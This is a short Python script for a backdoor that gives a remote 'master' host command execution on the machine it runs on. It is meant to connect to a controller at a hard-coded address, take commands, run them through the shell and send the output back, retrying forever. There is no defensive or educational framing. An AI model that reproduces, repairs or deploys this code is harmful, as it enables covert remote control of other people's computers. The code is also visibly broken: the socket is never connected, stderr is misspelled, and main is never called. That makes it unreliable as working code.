import socket,subprocess,sys,shlex

master_ip = '127.0.0.1'
master_port = '5262'

def connection(host,port):
	connection_to_master = socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
	data = connection_to_master.recv(1024) #script will block here waiting for instructions.
	return data,connection_to_master 

def execute_command(data,connection_to_master):
	command = shlex.split(data)
	if 'exit now' in command :
		connection_to_master.close()
		sys.exit()
	try : 
		command_exe = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE) # check stderr 
		command_exe_result = command_exe.stdout.read() + command_exe.sterr.read()
		connection_to_master.send(command_exe_result)
	except Exception as e : 
		connection_to_master.send(command_exe_result)

def main():
	while True : 
		try: 
			initial_connect = connection(master_ip,master_port)
			execute_command(initial_connect[0],initial_connect[1])
		except:
			pass # Use time here if needed, and wait a few seconds if exception == or 'host down' in exception



